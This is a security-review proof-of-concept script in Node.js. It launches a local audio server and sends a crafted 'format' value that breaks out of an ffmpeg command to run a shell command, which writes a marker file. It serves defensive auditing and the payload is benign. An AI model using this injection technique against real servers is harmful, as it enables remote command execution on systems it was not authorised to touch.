// A14: security review — command injection through the REST `format` parameter
import { spawn } from "node:child_process";
import { existsSync, readFileSync, rmSync, mkdirSync } from "node:fs";
import { join } from "node:path";

const root = process.cwd();
const work = join(process.env.TEMP, "aureal-audit", "sec2");
rmSync(work, { recursive: true, force: true });
mkdirSync(work, { recursive: true });
const port = 18107;

const child = spawn(process.execPath, [join(root, "docker", "server.js")], {
  cwd: work, // keep any injected side-effect inside the scratch dir
  env: { ...process.env, PORT: String(port), HOST: "127.0.0.1" },
  stdio: ["ignore", "pipe", "pipe"],
});
let log = "";
child.stdout.on("data", (d) => (log += d));
child.stderr.on("data", (d) => (log += d));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
for (let i = 0; i < 50; i++) { try { const r = await fetch(`http://127.0.0.1:${port}/v1/health`); if (r.ok) break; } catch {} await sleep(200); }

// minimal 16-bit WAV, 4 s of a tone, enough for one frame
const sr = 44100, ch = 2, secs = 4, frames = sr * secs;
const pcm = Buffer.alloc(frames * ch * 2);
for (let i = 0; i < frames; i++) {
  const v = Math.round(0.4 * 32767 * Math.sin((2 * Math.PI * 440 * i) / sr));
  for (let c = 0; c < ch; c++) pcm.writeInt16LE(v, (i * ch + c) * 2);
}
const hdr = Buffer.alloc(44);
hdr.write("RIFF", 0); hdr.writeUInt32LE(36 + pcm.length, 4); hdr.write("WAVE", 8); hdr.write("fmt ", 12);
hdr.writeUInt32LE(16, 16); hdr.writeUInt16LE(1, 20); hdr.writeUInt16LE(ch, 22); hdr.writeUInt32LE(sr, 24);
hdr.writeUInt32LE(sr * ch * 2, 28); hdr.writeUInt16LE(ch * 2, 32); hdr.writeUInt16LE(16, 34);
hdr.write("data", 36); hdr.writeUInt32LE(pcm.length, 40);
const wav = Buffer.concat([hdr, pcm]);

const marker = "aureal_rce_proof.txt";
// value injected into: execSync(`ffmpeg ... "${tempWav}" ... -c:a libmp3lame ... "${tempOut}"`)
const payload = 'mp3" & echo AUREAL_RCE_PROOF > ' + marker + ' & rem "';
const url = `http://127.0.0.1:${port}/v1/embed?id=1234&format=` + encodeURIComponent(payload);

try {
  const r = await fetch(url, { method: "POST", headers: { "Content-Type": "audio/wav" }, body: wav });
  console.log("HTTP status :", r.status);
  console.log("response    :", (await r.text()).slice(0, 200).replace(/\s+/g, " "));
} catch (e) {
  console.log("request failed:", e.message);
}
await sleep(800);
const proof = join(work, marker);
console.log("\nside-effect file created in server cwd:", existsSync(proof));
if (existsSync(proof)) console.log("its contents:", readFileSync(proof, "utf8").trim());
console.log("\n--- server log ---\n" + log.slice(0, 1500));
child.kill();
